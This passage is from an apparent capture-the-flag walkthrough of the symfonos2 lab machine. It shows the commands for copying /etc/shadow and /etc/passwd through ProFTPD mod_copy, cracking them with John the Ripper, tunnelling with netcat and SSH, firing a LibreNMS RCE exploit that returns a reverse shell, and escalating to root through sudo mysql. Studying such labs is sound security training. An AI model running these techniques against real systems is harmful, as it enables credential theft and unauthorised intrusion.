Looks like we have an open SMB share called 'anonymous', so let's see what we have to work with
there:
```
# smbclient -W WORKGROUP -N \\\\10.0.100.28\\anonymous

smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt...
```

A brief look over the log.txt file appears to show us that it contains the configuration files for
ProFTPD and Samba, but there is a very important detail at the very top of that log.txt file that
is easy to miss:
```bash
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
```

For those who do not know, the shadow file is where hashed password data is stored; now we just
need to pull that file... Since we have ProFTPD and Samba for file transfer methods, let's take a
closer look at those. ProFTPD is version 1.3.5 and Samba is version 4.5.16-Debian. Searches for
Samba exploits for that version do not yield anything, but a search of the Exploit-DB for this
version of ProFTPD brings us to a file copy vulnerability [here][4].

Since I know that the purpose of this box is to ensure we understand how the vulnerabilities we are
using actually work, I took a close look at this vulnerability and just executed the necessary
commands manually. Please see the original posting on Exploit-DB linked above for details about
the exploit, as I will only be pasting the commands I used below.
```
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/passwd.bak
250 Copy successful
```

Now when we check the anonymous share, we see our two copied files:  

![Steal those passwords](/assets/images/symfonos2-smb-new-files.png)  

Once I pull down those two files, I used John the Ripper's `unshadow` to combine them for cracking:
```
# unshadow passwd.bak shadow.bak > symfonos2-john
```

Now the combined file is ready to throw at John the Ripper:
```
# john --wordlist=/usr/share/wordlists/rockyou.txt symfonos2-john
```

Not quite sure how long it took since I kicked it off and walked away, but when I returned I found
it had cracked the password for the user 'aeolus', and with that we get to ssh into the computer
as a normal user with a full shell! Unfortunately, aeolus isn't allowed to sudo so we are left to
continue our search for a way to escalate privileges.

I used the LinEnum.sh script again to try and identify potential avenues to root, and one of the
items in the report was what was listening on this server:
```

```

It would appear that there are some services that are running and only being offered up on the
localhost (127.0.0.1), 8080 and 3306. These ports are typically used for HTTP and MySQL
respectively. A quick `curl` GET request to http://127.0.0.1:8080 shows us that we are looking at
a login page, so I decided to start there. Another piece of information we got from the LinEnum.sh
script is that netcat is installed, so we can use that to get a quick look at the website using a
named pipe. This is a great trick that I picked up from my time in the SANS SEC560 course. It is a
little tricky to really grasp, but I will do my best to describe what's going on here:
```
mknod backpipe p
nc -l -p 8006 0<backpipe | nc 127.0.0.1 8080 1>backpipe
```

The first command makes a special FIFO (first in, first out) file named 'backpipe', which makes it
a named pipe. Think pipe like the pipe character, and back because it is going to redirect output
back to us. The second command is where the magic happens, but to understand that, we need to
understand what some of these things mean. '0' (zero) is standard input, '1' (one) is standard 
output, and '2' (two) is standard error. Armed with this knowledge we can dissect the command
above:
```
nc = netcat
-l = listen
-p = port to listen on, 8006 in the example above
0< = send the data to 'standard input', in our case the contents of 'backpipe'
```

Because we are piping that whole command to the next command, what is being sent to standard input
is passed to the next command, which is another instance of netcat, which we will look at now:
```
nc = netcat
127.0.0.1 8080 = the IP address and port to connect to
1> = send 'standard output' somewhere, in our case to the 'backpipe'
```

This effectively allows us to transmit traffic to backpipe and will then tell the webserver to
send data back to backpipe, which is then read back to us. This is great, since it allowed us to
navigate to the webpage by pointing our web browser at http://10.0.100.28:8006, but there was one
flaw in my plan, and that was that I wasn't thinking about persistence. When I made my connection,
I didn't think about the fact that the connection would be made, and then torn down, because it is
a normal web request, which isn't going to maintain a connection like other protocols. Long story
even longer: the netcat backpipe closed with every successful web request, which means we need
something that offers a constant connection. Enter SSH tunneling!  

This topic is definitely documented elsewhere on the internet, and I encourage you to look at the
following topics that relate to the topic of SSH tunneling:
 * Local Port Forwarding
 * Remote Port Forwarding
 * Dynamic Port Forwarding

What I did below is remote port forwarding _from the victim machine_:
```
# ssh graboid@10.0.100.23 -R 8006:127.0.0.1:8080
```

The rough idea of what is going on here:
 * SSH from the victim machine to the attacking computer
 * Allow traffic to come into the victim computer on port 8006, from the attacking computer
 * Take that traffic that comes in on port 8006 and send it to 127.0.0.1:8080

Once this is complete, we can see that we have a connection on our attacking computer using
`netstat`:  

![New connections!](/assets/images/symfonos2-reverse-port-forward-listening.png)  
  
So now when we point our browser to http://127.0.0.1:8006/ we get the same login page:  

![Login page](/assets/images/symfonos2-librenms-login.png)

But this time, we can interact with it without having to re-start the netcat/backpipe setup! Whew!
Now that that's taken care of, we can try to log into the site. Admin/admin? Well that didn't
work, but maybe the 'aeolus' user with the password we cracked earlier... And we're in!  

![Great success](/assets/images/symfonos2-librenms-login-success.png)

From here, we just need to figure out if there's a way to abuse LibreNMS site. In keeping with our
theme today, let's hop on over to Exploit-DB and see what we can find. One quick search later, and
we have an [RCE exploit][5]. Glancing over the code it would appear we need to supply the URL, a
cookie, our attacking IP address and a listening port on our machine. The exploit doesn't specify
what cookie we need to supply, so we'll have to figure out what that looks like by inspecting our
browser.  

Opening up the developer panel and navigating to the storage section, we find a couple of different
cookies, but the one that looks most promising is the 'librenms_session' cookie. Stringing all that
together:
```
# python librenms.py http://127.0.0.1:8006 "librenms_session=eyJ...%3D" 10.0.100.23 4444
[+] Device Created Sucssfully
```

But no notification that I should check my netcat listener...checking it anyway shows me that it
hasn't received any incomming connections...odd. Digging into the exploit a little bit more, it
appears that this exploit works because the web application doesn't properly sanitize user inputs
in the community field when setting up a device using snmp, since that is where the exploit puts
the payload. I checked to see if the device was created in the console, and confirm that it is
there, so let's dig a little deeper and see if we can trigger the exploit manually from the site...

Poking around I don't see anything that immediately makes me think it is going to pull SNMP from
the device, but I noticed the gear icon on the right side of the page and find a 'capture' item in
the drop down. Selecting this takes me to the debug collection page that, conveniently enough, has
an SNMP tab. A quick check of this tab gives us a run button... Woo! Sweet, sweet reverse shell!
Let's see who we are this time...Cronus this time! Wonder if he can sudo...

Well now, that makes things easy sailing from here:
```
# sudo /usr/bin/mysql
MariaDB [(none)]> \! bash;
root@symfonos2:/opt/librenms: # id
id
uid=0(root) gid=0(root) groups=0(root)
```

Our reward? Bitchin ascii art!
